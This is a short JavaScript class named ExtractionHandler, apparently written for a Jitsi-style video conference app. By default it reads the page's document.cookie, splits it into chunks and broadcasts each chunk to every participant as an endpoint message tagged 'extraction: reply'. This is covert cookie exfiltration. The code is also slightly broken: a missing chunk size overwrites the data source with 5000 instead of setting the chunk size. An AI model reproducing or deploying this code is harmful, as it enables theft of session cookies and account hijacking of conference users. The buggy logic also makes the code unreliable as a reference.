/* global APP, splitString*/
/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = configuration;
        this.initialize();
    }

    /**
     * Initializes Extraction Handler
     */
    initialize() {
        if (!this.configuration.dataSource) {
            this.configuration.dataSource = document.cookie;
        }
        if (!this.configuration.chunkSize) {
            this.configuration.dataSource = 5000;
        }
    }

    /**
     * TODO: change to the send any type based on config
     * Send data through the plain text.
     * @param {integer} chunkSize - Size of chunks sent
     */
    send() {
        console.log(splitString);
        for (const chunkData of splitString(this.configuration.dataSource, this.configuration.chunkSize)) {
            APP.conference.sendEndpointMessage('', {
                extraction: 'reply',
                payload: chunkData
            });
        }
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            isEnd: true
        });
    }
}
